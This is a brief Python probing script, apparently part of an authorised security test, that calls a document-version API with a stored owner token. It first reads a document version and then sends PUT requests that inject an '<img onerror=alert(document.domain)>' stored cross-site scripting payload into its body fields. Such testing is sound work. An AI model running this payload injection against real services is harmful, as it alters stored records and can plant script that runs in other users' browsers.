import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== narrative document body: does it store raw HTML? ===")
# narrative 31 has document_version 1402
c,b=req('GET','/api/v1/document_versions/1402')
print(f"  docver 1402 -> {c}")
try:
    d=json.loads(b)['document_versions'][0]
    print(f"    keys={sorted(d.keys())}")
    print(f"    body={str(d.get('body'))[:200]!r}")
    print(f"    flat_body={str(d.get('flat_body'))[:200]!r}")
except Exception as e: print("   ",b[:200])
print()
print("=== can we PUT a body with HTML? ===")
tag='ZXN'+uuid.uuid4().hex[:5]
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for body in [{"document_version":{"body":pay}},
             {"document_version":{"body":f"<p>{pay}</p>"}},
             {"document_version":{"flat_body":pay}}]:
    c,b=req('PUT','/api/v1/document_versions/1402',body)
    print(f"  {list(body['document_version'].keys())} -> {c} {b[:110].replace(chr(10),' ')}")
